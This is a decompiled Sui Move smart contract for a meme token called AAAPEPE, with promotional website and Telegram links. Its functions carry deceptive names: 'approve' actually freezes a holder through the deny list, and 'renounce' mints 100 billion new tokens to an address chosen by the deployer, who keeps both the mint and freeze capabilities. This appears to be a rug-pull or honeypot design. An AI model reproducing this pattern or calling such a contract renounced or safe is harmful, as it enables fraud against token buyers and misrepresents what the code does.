module 0x60027cc1a4c272b088215a0a81d5efd8e5eb0b09b02337890fd79af374b76d5e::aaapepe {
    struct AAAPEPE has drop {
        dummy_field: bool,
    }

    public entry fun approve(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AAAPEPE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<AAAPEPE>(arg0, arg1, arg2, arg3);
    }

    public entry fun approved(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AAAPEPE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<AAAPEPE>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: AAAPEPE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<AAAPEPE>(arg0, 2, b"AAAPEPE", b"AAAPEPE", b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA - https://aaapepe.tech/ - https://t.me/AAAPepeGlobal - https://t.me/AAAAAAPEPE", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://aaapepe.tech/aaa.gif"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<AAAPEPE>>(v2);
        let v4 = 0x2::tx_context::sender(arg1);
        0x2::coin::mint_and_transfer<AAAPEPE>(&mut v3, 1000000000, v4, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<AAAPEPE>>(v3, v4);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<AAAPEPE>>(v1, v4);
    }

    public entry fun renounce(arg0: &mut 0x2::coin::TreasuryCap<AAAPEPE>, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<AAAPEPE>(arg0, 100000000000, arg1, arg2);
    }

    // decompiled from Move bytecode v6
}

